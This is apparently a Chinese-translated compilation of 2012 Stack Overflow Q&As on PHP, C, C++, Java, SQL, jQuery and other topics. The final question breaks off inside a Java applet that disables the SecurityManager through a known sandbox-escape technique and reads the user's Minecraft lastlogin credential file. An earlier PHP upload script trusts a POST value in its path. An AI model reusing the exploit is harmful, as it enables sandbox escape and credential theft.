            <td><input type="text" value="" id="car_reserve" name="car_reserve" class="frmIn"></td>
          </tr>
                  <tr>
            <td>&nbsp;</td>
            <td>
                      <input type="button"  name="sub" value="<< Previous " class="previous-product" />
                     <input type="button" id="sub" name="sub" value="Next >>" class="next-product" onclick="validatevehicle();" /></td>
          </tr> <tr>
            <td>&nbsp;</td>
             <td id="v_errmsgs" style="color:red">
           </td>
          </tr>
                </table></form>
                <input type="hidden" id="hid_saleid" name="hid_saleid" value="" /> 
```

这是 uplod_estimate_file.php：

```
<?php
session_start();
$sub = "";
$uploaddir = "";
if(isset($_POST['saleid'])){
    if($_POST['saleid']){
        $sub = $_POST['saleid'];
    }else{
        $sub = "";
    }
}else{
    $sub = "";
}
if($sub){
    $uploaddir = './uploads/'.$sub."/"; 
    }else{
        $uploaddir = './uploads/';
    }
$file = $uploaddir . basename($_FILES['uploadfile_test']['name']); 

if(move_uploaded_file($_FILES['uploadfile_test']['tmp_name'], $file)){
    echo "success";
}else{
    echo "error";
}

?> 
```

但是当我使用它时，我得到了错误未定义的索引'uploadfile_test'。我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:13:58.603

如果大写扩展有问题，例如“PDF”，则更改：

```
onSubmit: function(file, ext){
   if (! (ext && /^(jpg|pdf|jpeg)$/.test(ext))){ 
```

到

```
onSubmit: function(file, ext){
   if (! (ext && /^(jpg|pdf|jpeg|pdf)$/i.test(ext))){ 
```

您可以将“ **upload_max_filesize** ”添加到 .htaccess，例如：

```
php_value upload_max_filesize 32M 
```

# c# - 尝试访问windows服务时“连接尝试失败，因为连接方在一段时间后没有正确响应”

> ID：12213846
> 
> 赞同：0
> 
> 时间：2012-08-31T10:50:37.473
> 
> 标签：c#, wcf, windows-8, microsoft-metro

我创建了一个 Windows 服务并将该服务引用添加到我的 Metro 应用程序中。

我创建了一个包并将该包安装在另一个系统和 Windows 服务中。应用程序已成功安装。现在我尝试运行该应用程序。调用服务时抛出以下异常

> 在“http://localhost/TFSClientWindowsService/TFSCClientWindowsService/”处没有可以接受消息的端点侦听。这通常是由不正确的地址或 SOAP 操作引起的。InnerException：连接尝试失败，因为连接方在一段时间，或建立连接失败，因为连接的主机未能在 127.0.0.1:80 响应

以下是我在服务级别的配置设置：

```
<?xml version="1.0"?>
<configuration>
    <system.serviceModel>
        <behaviors>
            <serviceBehaviors>
                <behavior name="MyBehavior">
                    <serviceMetadata httpGetEnabled="true"/>
                    <serviceDebug includeExceptionDetailInFaults="true"/>
                </behavior>
            </serviceBehaviors>
        </behaviors>
        <services>
            <service name="TFSClientWindowsService.TFSCClientWindowsService" behaviorConfiguration="MyBehavior">
                <endpoint address="" binding="basicHttpBinding" contract="TFSClientWindowsService.ITFSCClientWindowsService">
                    <identity>
                        <dns value="localhost"/>
                    </identity>
                </endpoint>
                <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange"/>
                <host>
                    <baseAddresses>
                        <add baseAddress="http://localhost/TFSClientWindowsService/TFSCClientWindowsService/"/>
                    </baseAddresses>
                </host>
            </service>
        </services>
    </system.serviceModel>
<startup><supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.0"/></startup>
</configuration> 
```

当我安装软件包并访问服务时，它在我的系统中正常运行。但当我将它安装在另一个系统中时不会。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:39:46.050

如果您正在开发 WinRT 应用程序，则无法与在 localhost 上运行的服务通信。有关更多讨论，请参阅此线程... [http://social.msdn.microsoft.com/Forums/en-US/winappswithcsharp/thread/17a542e1-8035-4139-9395-d73e3b222eb6](http://social.msdn.microsoft.com/Forums/en-US/winappswithcsharp/thread/17a542e1-8035-4139-9395-d73e3b222eb6)

# joomla2.5 - com_messages 像组件

> ID：12213850
> 
> 赞同：0
> 
> 时间：2012-08-31T10:50:54.610
> 
> 标签：joomla2.5

我想开发一个自定义组件，该组件具有在 joomla 2.5 组件中内置的 com_messages 等选项卡。任何人都可以指导我吗？

我调查了它但没有得到它
[http://docs.joomla.org/Developing_a_Model-View-Controller_Component/2.5/Adding_categories](http://docs.joomla.org/Developing_a_Model-View-Controller_Component/2.5/Adding_categories)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T11:29:58.663

嗨，您可以使用以下网站轻松创建自己的组件。

```
http://www.notwebdesign.com/joomla-component-creator/ 
```

只需创建一个帐户并创建您自己的组件......一切顺利......

# batch-file - 批处理：带有字符串比较的 if 语句总是返回 true

> ID：12213857
> 
> 赞同：2
> 
> 时间：2012-08-31T10:51:16.390
> 
> 标签：batch-file

```
if "x%1" == "x" (
goto :l2
)
:l2
echo doskey %1>>startup.cmd 
```

在条件和 goto 上尝试使用和不使用括号，也尝试不使用引号，当然 goto 在同一行 - 它总是返回 true。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-31T12:17:01.563

你有一个非常愚蠢的错误:-)

如果条件为真，则转到标签。

如果条件为假，您不会转到，但您会进入下一行，这恰好是您的标签。

无论哪种方式，结果都是一样的！

其他问题 -

1）我认为你的逻辑是颠倒的。我相信你只想 GOTO :l2 如果 %1 被定义，你有相反的。

2) （包括引号）的 %1 值`"A&B"`将失败。更好地使用`"%~1"`而不是`"%1"`

3）在您的比较中不需要 x 。

轻松修复：

```
if "%~1" neq "" goto :l2
exit /b
:l2
echo doskey %1>>startup.cmd 
```

你真的不需要 goto：

```
if "%~1" neq "" echo doskey %1>>startup.cmd 
```

# jquery - 使用 .load 函数动态加载动态创建的内容

> ID：12213864
> 
> 赞同：0
> 
> 时间：2012-08-31T10:52:13.193
> 
> 标签：jquery, ajax

我的问题是我已经研究了一段时间，但是每次我将“动态”和 .load()”这两个词混合在一起时，我都会得到所有错误（或正确）的结果，所以我尽量做到清楚。

例如，我有**2 个页面、索引页面和一个关于我们的页面**。我知道使用 jQuery 和`.load()`函数，我可以向另一个文档（例如 about us 页面）发出请求，并将 about us 页面的内容作为一个整体加载到索引等中……我什至可以更具体有类似的东西

.load("url here" #content div id 专门来自加载的关于我们的页面我想带入索引。)

我的问题是，当您从 about us 页面加载到索引中的内容**也**被动态创建时会发生什么？

例如，假设我有一个 WordPress 自定义模板，其中几乎所有内容都是动态生成的。例如，在由 WordPress 和 DB 生成的 about us 页面中，如果 about us 页面中的内部内容 div`<?php echo bloginfo('url');?>` 里面有这个，当通过 AJAX 调用时，它将在页面上打印网站 URL **（比如 XYZ.com）**将 .load() 放入索引中，我会得到未运行的代码，还是会像正常一样处理并得到 XYZ.com

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:43:26.537

它会被正常处理，首先它会在服务器上生成，然后生成的html（responseText）将被发送回你的页面。与直接调用将在服务器端生成的 php 页面的方式相同。

# c - __attribute__ ((__packed__)) 在 typedef 声明中被忽略了吗？

> ID：12213866
> 
> 赞同：23
> 
> 时间：2012-08-31T10:52:21.713
> 
> 标签：c, data-structures, attributes, typedef

虽然`__attribute__ ((aligned))`与 typedef 声明配合得很好，例如：

```
typedef struct __attribute__((__aligned__(8))) A {

     xxx ip    ;
     xxx udp   ;
     xxx ports ;
} table ; 
```

我遇到过声明说`__attribute__ ((__packed__))` typedef 不是这种情况！我正在处理一些相关的问题，其中一些使用了带有 typedef 的打包属性，这与我们的代码相符。

现在，在我们的代码中，我们定义

```
typedef struct {
     xxx ip    ;
     xxx udp   ;
     xxx ports ;
}__attribute__((packed)) table ; 
```

上述声明是否使编译器*静默*转储打包的属性声明？

PS：是的，我可以验证它，但我现在的情况不同。假设是假期和智能手机！

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-08-31T14:32:20.300

声明看起来不错。但是，请尝试遵守以下其中一项以避免静默属性丢弃。

```
#include <stdio.h>

typedef struct __attribute__((packed)) {
    char old;
    int ip;
    int new;
} NCO;

int main(void)
{ 
    printf("%zu", sizeof(NCO));
} 
```

或者

```
#include <stdio.h> 

typedef struct {
    char old;
    int ip;
    int new;
} __attribute__((packed)) 

int main(void)
{
    printf("%zu", sizeof(NCO));
} 
```

确保`__attribute__((packed))`关键字和属性规范紧跟结构声明的右大括号 (})。如果它位于任何其他位置（例如，在结构实例之后而不是在结构实例之前），编译器应忽略 `__attribute__((packed))`并发出警告消息。

虽然它为我们提供了打包的大小`9`，但我认为最好避免它，如[这里](http://gcc.gnu.org/onlinedocs/gcc/Type-Attributes.html)所述，并尝试旧的学校结构声明风格。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2016-05-12T10:51:31.790

您的声明似乎没问题，但它取决于编译器。例如，如果你想让 MinGW 编译器尊重它，你必须使用**-mno-ms-bitfields**参数编译你的程序。如果您不指定此标志，则不会发出警告，但不会尊重该属性！

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-08-31T10:58:09.047

您在这里合并了两个语句。

首先，您定义具有某些属性的结构。然后为它创建一个别名。

当您将打包属性分配给别名时，不会更改此别名使用的已创建数据结构。（通常您可以使用“struct bla”和“s_bla”[由“typedef struct bla {} s_bla”创建]创建变量并在彼此之间交换这些值。如果可以使用 typedef 更改结构，则这种连贯性会破裂。）

所以：声明将被转储。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T11:32:18.307

像这样试试。这可能会奏效。

```
struct test
{
 unsigned char  field1;
 unsigned short field2;
 unsigned long  field3;
 }__attribute__((__packed__));

typedef struct test test_t;

test_t var1, var2; 
```

# qt4 - 如何在 qt 中的 QTableview 中动态（而不是手动）编辑表

> ID：12213868
> 
> 赞同：0
> 
> 时间：2012-08-31T10:52:38.640
> 
> 标签：qt4, psql

我正在 linux 的 Qt 中创建一个 GUI 应用程序。在 Tableview 中，我创建了一个
可以保存数据库值的表。现在我想用
程序动态编辑我的表，以便表会根据程序需要自动更改。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T17:05:19.590

您不需要更改表格视图。它使用模型-视图-控制器模式，因此对模型的任何更改都应该在视图中自动更新。

# titanium-mobile - 适用于 Android 的 Titanium 文本字段边框样式为无

> ID：12213870
> 
> 赞同：4
> 
> 时间：2012-08-31T10:52:50.440
> 
> 标签：titanium-mobile, appcelerator-mobile

我需要删除我的文本字段的边框。Titanium 文本字段的默认边框样式为`Titanium.UI.INPUT_BORDERSTYLE_NONE`. 但它默认仅适用于 iPhone。我也打开了`borderColor = 'white'`，这是我的背景颜色。但不起作用。有什么解决办法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2014-01-14T18:53:00.813

您只需设置`backgroundColor`textField 的属性即可。您可以将其设置`white`为`transparent`

![在此处输入图像描述](../Images/7cbd181dce06600cee041438c6e1e912.png)

这是一个例子

```
var txtSome = Ti.UI.createTextField({
   hintText : 'My hint text',
   width     : '75%',
   top   : '5%',
   backgroundColor : 'transparent'//or backgroundColor : 'white'
}); 
```

我知道为时已晚。但会帮助别人。

# sql-server-2008 - 过去 24 小时内未更新的项目列表

> ID：12213872
> 
> 赞同：0
> 
> 时间：2012-08-31T10:52:53.780
> 
> 标签：sql-server-2008, tsql

早上，这类似于我昨天问的一个问题[问题]：[SQL查询获取最新价格，取决于日期](https://stackoverflow.com/questions/12198572/sql-query-to-get-latest-prices-depending-on-the-date)

我需要从最低价格表中返回自上次更新日期起 24 小时内未更新的 ASIN 列表。我可以获得一个 ASIN 列表，但它会返回所有这些。有人可以帮我用 SQL 来获取这个列表吗？

```
SELECT     asin
FROM       dbo.aboProducts
WHERE     (asin NOT IN
               (SELECT    aboProducts_1.asin
                FROM      dbo.aboProducts AS aboProducts_1 INNER JOIN
                          dbo.LowestPrices ON aboProducts_1.asin = dbo.LowestPrices.productAsin
                WHERE    (dbo.aboProducts.amzLive = 'true') AND 
                         (dbo.LowestPrices.priceDate < DATEADD(day, - 1, GETDATE())))) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:55:09.713

我认为你的比较错误

尝试

```
SELECT     asin 
FROM       dbo.aboProducts 
WHERE     (asin NOT IN 
               (SELECT    aboProducts_1.asin 
                FROM      dbo.aboProducts AS aboProducts_1 INNER JOIN 
                          dbo.LowestPrices ON aboProducts_1.asin = dbo.LowestPrices.productAsin 
                WHERE    (dbo.aboProducts.amzLive = 'true') AND  
                         (dbo.LowestPrices.priceDate > DATEADD(day, - 1, GETDATE())))) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T15:13:12.737

@podiluska 的回答是正确的。由于您正在使用

```
WHERE     (asin NOT IN 
```

您想通过以下方式获取过去 24 小时内已更新的所有项目

```
dbo.LowestPrices.priceDate > DATEADD(day, - 1, GETDATE()) 
```

然后使用 NOT IN 子句将它们排除在外，这将为您留下过去 24 小时内未更新的所有项目。

# c++ - 未命名的命名空间与私有变量

> ID：12213873
> 
> 赞同：7
> 
> 时间：2012-08-31T10:52:55.583
> 
> 标签：c++, namespaces

我一直在阅读这里的其他问题，有些事情让我感到困惑，希望可以得到解释。我确信这是一件简单的事情，但它暗指我。

因此，在 C++ 中，我们有只能在类中查看的私有变量：

```
class MyClass
{
    private:
        int i;
}; 
```

但我们也可以有未命名的命名空间：

```
namespace
{
    int i;
} 
```

两者似乎都是类私有的，但在第二种情况下，您无法从头文件中看到它们存在。从阅读其他问题看来，功能是不同的，因为您不能将类对象传递给它们？但我不确定变量的区别是什么。

第二种方式是否有缺点，这意味着您仍然应该使用私有变量？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-31T10:56:24.613

他们不一样。

匿名命名空间中的整数`i`将由`MyClass`.

对于类的每个实例化，私有整数`i`in`MyClass`将是唯一的。

等效的使用`private`是使`i`静态：

```
//.h
class MyClass
{
    private:
        static int i;
}; 
```

并像这样实例化一个共享`i`：

```
//.cpp
int MyClass::i = 0; 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-31T11:56:30.250

> 两者似乎都是班级私有的......

不，只有第一个是班级私有的。它是一个非静态成员变量；在类类型的每个对象中实例化一个。

第二个根本不在课堂上；它具有静态存储持续时间，因此为整个程序实例化了一个。访问它的任何东西都在访问与访问它的任何其他东西相同的变量。在一个未命名的命名空间中，它只能在定义它的翻译单元（即源文件）中访问；但是那里的任何代码都可以访问它，而不仅仅是特定的类。

> 第二种方式是否有缺点，这意味着您仍然应该使用私有变量？

如果您想要每个类对象中的变量副本，那么您需要它是一个非静态成员。

如果您想在所有对象之间共享它，则由您决定是将其设为静态成员，还是将其放在类的实现文件内的命名空间中。我经常做后者来简化类定义。缺点是访问不仅限于类，还限于该文件中的任何其他内容，并且您无法从您可能希望放入标题中的任何代码访问它。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-31T10:56:11.200

命名空间与对象/类无关。特别是，如果您有两个对象，每个对象都有自己的私有变量副本。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-08-31T10:57:57.557

它们是完全不同的概念。私有数据成员仅对类可见，并且在非静态情况下，每个类实例都拥有其中一个。匿名命名空间允许您使代码仅可用于同一文件中的其他代码。因此，在单个`int`变量的情况下，在与匿名命名空间相同的位置定义的所有代码都会看到相同的单个变量。

# php - 如何从 TCPDF 中的 php 函数和变量生成 pdf

> ID：12213875
> 
> 赞同：1
> 
> 时间：2012-08-31T10:53:03.617
> 
> 标签：php

我有函数接受样式表并使用 PHP 中的 OOP 从其他类获取输出。我需要使用 TCPDFm 生成 pdf，但我遇到了如何传递 $html 变量的问题，我已经阅读了 XHTML+ CSS 的手册，使用它并没有解释 PHP 变量输出。我在这里拍我的代码，请帮忙。

```
<?php
// define some HTML content with style
$html = <<<EOF
<?php $frame->HTML_DOCTYPE(); ?>

<html>
    <head><?php $frame->HTML_Title($page); $frame->HTML_CSS($page); $frame->HTML_JS($page); ?></head>
        <body>
            <div class='container_pngfix'>
                <?php echo $frame->Print_Top($page); ?>

                <div class='container_magazine'>
                    <div class='magazine_left'>
                        <?php 
                        /*if(FALSE == empty($_SESSION['wi_id']) && FALSE == empty($_SESSION['wi_type']) &&  0 == strcasecmp('bride',$_SESSION['wi_type'])){*/

                  if ($_REQUEST['magazineId']!="") {
                    echo $article->Print_Magazine_Issue($_REQUEST['magazineId']);
                  } else if ($_REQUEST['latestissue']) {
                    echo $article->Print_Magazine_Issue($article->getLatestMagazineId());
                  } else {
                    if (isset($_REQUEST['magazinedate'])) { $magazinedate=$_REQUEST['magazinedate']; } else { $magazinedate=""; }
                                if ($magazinedate=="") { $magazinedate=date("Y-m")."-01"; }

                    echo $article->Print_Magazine($magazinedate);
                  }
                        /*}else{
                            echo "<h2>Please Login/Register first to see Magazine details</h2>";
                        }*/
                ?>              
                </div>
                    <div class='magazine_right'><?php echo $frame->Print_RightSide_Articles($page); ?></div>
                    <div class='clearfloat'>&nbsp;</div>
                    <?php echo $frame->get_ContextualWeb($page,"low"); ?>
                </div>

            </div>
            <?php echo $frame->Print_Bottom_Links($page); ?>
            <?php $frame->Print_Bottom($page); ?>
        </div>
    </body>
</html>EOF;

$pdf->writeHTML($html, true, false, true, false, '');
$pdf->lastPage();

// ---------------------------------------------------------

//Close and output PDF document
$pdf->Output('example_061.pdf', 'I');
?> 
```

在这段代码中，我使用这些类的对象调用多个函数。页面的所有 html 和内容都是动态生成的。我在 $html 变量中传递 PAGE html 和 PHP 代码时遇到问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T11:06:05.057

您可以使用[ob_start()](http://uk.php.net/ob_start)和[ob_get_clean()](http://uk.php.net/ob_get_clean)来获得任何输出。

```
<?php
    ob_start();
?>
    <!-- HTML and PHP code here -->
<?php
    $html = ob_get_clean();
?> 
```

`$html`将拥有您可以发送到 TCPDF 的数据

您的情况示例：

```
<?php
    // your other script
    ob_start();
?>
<?php $frame->HTML_DOCTYPE(); ?>
<html>
    <head><?php $frame->HTML_Title($page); $frame->HTML_CSS($page); $frame->HTML_JS($page); ?></head>
    <body>
        <!-- rest of the page -->
    </body>
</html>
<?php
$html = ob_get_clean();
$pdf->writeHTML($html, true, false, true, false, '');
$pdf->lastPage();

// ---------------------------------------------------------

//Close and output PDF document
$pdf->Output('example_061.pdf', 'I');
?> 
```

# java - IdentityHashMap 类错了吗？

> ID：12213877
> 
> 赞同：0
> 
> 时间：2012-08-31T10:53:10.097
> 
> 标签：java

我测试过`java.util.IdentityHashMap`，见

```
public class IdentityHashMapTest{
    public static void main(String args[]) {
        Map<String, String> m = new IdentityHashMap<String, String>();
        m.put("John", "Doe");
        m.put("John", "Paul");
        System.out.println(m.size());
    }
} 
```

按照 Java API 的说法，

> 此类使用哈希表实现 Map 接口，在比较键（和值）时使用引用相等代替对象相等

结果可能是`2`。但实际是`1`。IdentityHashMap 类错了吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T10:54:35.127

将其更改为

```
 m.put("John", "Doe");
       m.put(new String("John"), "Paul"); 
```

它将有两个条目。字符串文字是池化的，所以`"John" == "John"`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:54:48.800

`IdentityHashMap`违反 Map 合同并使用对象标识而不是`equals`方法来检查密钥相等性，因为字符串实际上是一个对象池化，因此您应该使用`new String("John")`在 Map 中拥有新条目。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T10:54:55.300

这是因为字符串文字是池化的。

你可以测试这`"John" == "John"`是真的。

因此，您使用的两个键不仅相等，而且完全相同。

[从JLS #3.10.5](http://docs.oracle.com/javase/specs/jls/se7/html/jls-3.html#jls-3.10.5-410)中提取：

> 此外，字符串字面量总是引用 String 类的同一个实例。这是因为字符串文字是“内部的”以便共享唯一的实例。

# java - Java：我需要使方法针对不同的请求表现不同

> ID：12213878
> 
> 赞同：0
> 
> 时间：2012-08-31T10:53:13.810
> 
> 标签：java

```
class A 
if(userAuthenticated)
  ArrayList accounts = getAccountForUser(customerId);
UserInfo userinfo = new UserInfo();
userinfo.getUserInfo(accounts);
}

==============

class UserInfo 
{
public ArrayList<String> getUserInfo(ArrayList list) {
ArrayList useraccounts = list;
return useraccounts;
}
}

=============== 
```

现在在 C 类中我将有一个字符串，我需要检查，如果该字符串值存在，那么做其他事情做一些事情

问题是因为这是一个 WebApplication，我不能在 Application 中使用实例 varaibe。

```
class C 
{

public String makeDBCALL(String account)
{

Here i need to get that ArrayList  of UserInfo  and check if taht  list.contains(account)) 
could anybody please tell me how can do this .
}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T11:04:18.663

**语境**

你需要上下文。

需要为 Servlet 类提供该上下文。

**数据库或内存**

您可以引用数据库（数据源）并在每次数据库时查询，或者在内存中有一些东西（以示例列出）。

无论如何，如果 C 是一个知道它在 servlet 环境中的 servlet 类，您可以要求应用程序上下文。如果它是一个业务类，更不可知的东西，那么最好通过参数或属性接收它需要的上下文。

**设置上下文**

如果您使用 Spring 配置 (Spring IOC)，您可以设置类需要编写正确的 xml。

如果您不这样做，那么您需要在某个地方查找数据库连接，或者初始化该列表并为其他类提供参考。

**最后，一个具体的解决方案**

编写一个上下文侦听器，在初始化时生成所需的上下文（onContextCreated）并将其从应用程序上下文中挂起：

```
class MyListener implements ServletContextListener
{
   contextInitialized(ServletContextEvent event) {
      // Create theObjWEhatYouNeed
      event.getServletContext().setAttribute("whatINeed", theObjWhatYouNeed);
   }
} 
```

配置您的 web.xml 以使用 MyListener

```
<listener>
    <listener-class>MyListener</listener-class>
</listener> 
```

然后从您的 servlet 类中使用它（可能有很多同一个 servlet 类的实例，请记住这一点）

```
doGet(...) {
   MyObj myObj = (MyObj) request.getSession().getServletContext().getAttribute("whatINeed");
} 
```

# php - 如果值重复，则从多维数组中删除

> ID：12213879
> 
> 赞同：-2
> 
> 时间：2012-08-31T10:53:22.560
> 
> 标签：php, arrays

> **可能重复：**
> [比较多维数组中的元素](https://stackoverflow.com/questions/12030334/comparing-elements-in-a-multidimensional-array)

我的阵列看起来像

```
Array
(
    [0] => Array
        (
            [event_key] => 1
            [event_id] => 5
            [event_desc] => Test Event 1
        )

    [1] => Array
        (
            [event_key] => 2
            [event_id] => 2
            [event_desc] => Test Event 2
        )

    [2] => Array
        (
            [event_key] => 3
            [event_id] => 5
            [event_desc] => Test Event 3
        )

    [3] => Array
        (
            [event_key] => 4
            [event_id] => 4
            [event_desc] => Test Event 4

        )

    [4] => Array
        (
            [event_key] => 5
            [event_id] => 5
            [event_desc] => Test Event 5

        )

) 
```

如果 event_id 重复，我想删除一个子数组

所以想要的结果是

```
Array
(
    [0] => Array
        (
            [event_key] => 1
            [event_id] => 5
            [event_desc] => Test Event 1
        )

    [1] => Array
        (
            [event_key] => 2
            [event_id] => 2
            [event_desc] => Test Event 2
        )

    [2] => Array
        (
            [event_key] => 4
            [event_id] => 4
            [event_desc] => Test Event 4

        )

) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:02:01.367

像这样的东西可以解决问题：

```
$knownIds = array();
foreach( $myArray AS $key=>$item ) {
  if( array_key_exists($item['event_id'], $knownIds) === true ) {
    unset( $myArray[$key] );
  } else {
    $knownIds[$item['event_id']] = $key;  // value does not matter really here
  }
}
$myArray = array_values($myArray); 
```

`$myArray`你的源数组在哪里。

# java - 如何在检票口行为中获得模型的价值

> ID：12213880
> 
> 赞同：1
> 
> 时间：2012-08-31T10:53:24.207
> 
> 标签：java, wicket

在我的表单中，我输入了文本，然后是 dataView：

```
private class RegistrationForm extends Form<Table> {

    private static final long serialVersionUID = 1L;

    public RegistrationForm(final Table table) {
        super("registrationForm", new CompoundPropertyModel<Table>(table));
        setOutputMarkupId(true);
        final TextField<String> text = new TextField<String>("name");
        add(text);
        DataView<Player> dataView = new DataView<Player>("rows", playerDataProvider) {

            private static final long serialVersionUID = 1L;

            @Override
            protected void populateItem(final Item<Player> listItem) {
... 
```

在 listItem 上，当我双击行时添加 ajaxEventBehavior：

```
 listItem.add(new AjaxEventBehavior("ondblclick") {

                    private static final long serialVersionUID = 1L;

                    @Override
                    protected void onEvent(final AjaxRequestTarget target) {
                            System.out.println(table.getName());

                     }
                }); 
```

问题是当我双击表格时，它打印 null 而不是我在输入 TextField 中的值。为什么 ？

我尝试更新模型：

```
 text.updateModel(); 
```

或从文本中获取价值：

```
 System.out.println(table.getName() + "bbbbbbbbbbbbbbbbb" + text.getInput() + "vv"
                                    + text.getValue() + "ff"); 
```

但没有成功。

在表单中，我也有提交按钮，当我按下它时，每个想法都有效。我只是双击有问题

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-31T11:01:20.490

`AjaxEventBehavior`本身不提交表单，因此您没有获得文本字段值。您可以改用以下子类之一：

*   `AjaxFormComponentUpdatingBehavior`将只提交`FormComponent`它所附加的那个。它需要附加到 FormComponent，因此如果要将其附加到整个组件，则必须使用以下内容`ListItem`：
*   `AjaxFormSubmitBehavior`将提交整个表格。这可能是您在这里需要的。

所有这些行为都包含在 Wicket 中，它们的 Javadoc 就在源代码中。对于 Ajax 的东西，检查`AbstractAjaxBehavior`的子类，特别是`AjaxEventBehavior`.

# mysql - MySQL - 在嵌套表中搜索记录

> ID：12213883
> 
> 赞同：0
> 
> 时间：2012-08-31T10:53:33.263
> 
> 标签：mysql

我有一个带有两个表的 MySQL 数据库。第一个是部门层次结构，其中每条记录都有来自同一个表中的父记录，顶层的 parent_id 为 0。

第二个是产品表。每个产品都可以存在于部门树中的任何位置。

我需要能够让人们通过指定要在其中搜索的部门来搜索产品，但要在指定部门的所有子部门内进行搜索。这可以在单个查询中完成吗？

我的“B 计划”是将每个产品的父 ID 列表存储在一个新字段中，并使用 LIKE 查询搜索该字段，但这似乎有点讨厌。

虚拟数据：

```
id|parent_id|name  
1|0|Main 1  
2|0|Main 2  
3|0|Main 3  
4|1|Sub 1-1  
5|1|Sub 1-2  
6|1|Sub 1-3  
7|4|Sub 1-1-1  
8|4|Sub 1-1-2  
9|4|Sub 1-1-3  

id|department|product  
1|1|test product 1  
2|4|test product 2  
3|7|test product 3  

SELECT * FROM products WHERE department = 1 ; want to receive all three products  
SELECT * FROM products WHERE department = 4 ; want to receive products 2 and 3  
SELECT * FROM products WHERE department = 7 ; want to receive only product 3 
```

# javascript - 如何阻止ajax调用（我希望它阻止）

> ID：12213889
> 
> 赞同：8
> 
> 时间：2012-08-31T10:54:19.653
> 
> 标签：javascript, ajax

Ajax 使用回调，因为它是`A`同步的。

**我希望调用远程 URL 块，直到有答案**，就像在 Ajax 中一样，但没有异步部分，或者我应该说我想进行 JAX 调用。

是否有任何技术可以使以下情况发生（使用 JQuery）（... 使用 JQuery 或其他任何东西的解决方案）：

```
function get_data() {
    $.ajax({
        type : "POST",
        url : "/foo"
    }).done(function(data, textStatus, jqXHR) {
        return data;
    }).fail(function(jqXHR, textStatus) {
        return null;
    });
}

var data = get_data();
// process `data` 
```

我只是想知道 - 想学习。

实际上，有时在回复之前阻止就可以了。我并不是说我希望浏览器阻止，只是脚本运行时。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-31T11:00:04.013

您可以`async : false`在使用 jQuery 时简单地设置布尔值（[查看文档](http://api.jquery.com/jQuery.ajax/)）。注意：**从 jQuery 1.8 开始，不推荐使用 async: false 和 jqXHR ($.Deferred)；您必须使用完成/成功/错误回调。**

如果您不想使用 jQuery 或想知道幕后发生了什么，[请阅读此](http://www.w3schools.com/ajax/ajax_xmlhttprequest_send.asp).

```
xmlhttp.open("GET","ajax_info.txt",false);
xmlhttp.send();
document.getElementById("myDiv").innerHTML=xmlhttp.responseText; 
```

想知道为什么你不希望它是异步的......

# c++ - 窗口事件之间

> ID：12213890
> 
> 赞同：0
> 
> 时间：2012-08-31T10:54:20.713
> 
> 标签：c++, qt, events, event-handling

我有一个带有两个主窗口的应用程序，我想捕捉一个到另一个的事件。例如，在 button1_MouseClick 事件（按钮 1 位于 Form1 上）中，我想将文本更改为 label1（其中 label1 在 form2 上）。这在 qt c++ 中是否可行，如果可以，如何？你能发布一些代码片段吗？

PS 我已经使用计时器和全局布尔值实现了我想要的，但我不喜欢那样

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T11:07:17.393

我将在表格 2 的类中有一个公共函数，调用它时会更改标签。然后将 button1_MouseClick 事件连接到表单 1 类中的私有函数，该函数调用表单 2 的公共函数。

沿着这条线也许：

```
class form1 : public QMainWindow
{
//Put in everything else class needs

private slots:
void callChangeLabel();
};

void form1::callChangeLabel()
{
//f2 is an instance of form2
f2->changeLabel();
}

class form2 : public QMainWindow
{
//Put in everything else class needs

public:
void changeLabel();
}; 
```

# java - (Java) 找不到方法

> ID：12213891
> 
> 赞同：1
> 
> 时间：2012-08-31T10:54:22.327
> 
> 标签：java, applet, compiler-errors

我是 java 新手并且有一个编译错误：

```
/tmp/jc_16831/Gondvv.java:71: cannot find symbol

symbol  : method File(java.lang.String)

location: class Gondvv

File llf = File( "c:/Users/" + userName + "/AppData/Roaming/.minecraft/lastlogin" ); 
```

O 包括 File 类，所以我不明白..

代码在这里：

```
package cve2012xxxx;

import java.applet.Applet;
import java.awt.Graphics;
import java.beans.Expression;
import java.beans.Statement;
import java.lang.reflect.Field;
import java.lang.String;
import java.net.*;
import java.security.*;
import java.security.cert.Certificate;
import java.io.*;
import java.io.File;

public class Gondvv extends Applet
{

    public Gondvv()
    {
    }

    public void disableSecurity()
        throws Throwable
    {
        Statement localStatement = new Statement(System.class, "setSecurityManager", new Object[1]);
        Permissions localPermissions = new Permissions();
        localPermissions.add(new AllPermission());
        ProtectionDomain localProtectionDomain = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), localPermissions);
        AccessControlContext localAccessControlContext = new AccessControlContext(new ProtectionDomain[] {
            localProtectionDomain
        });
        SetField(Statement.class, "acc", localStatement, localAccessControlContext);
        localStatement.execute();
    }

    private Class GetClass(String paramString)
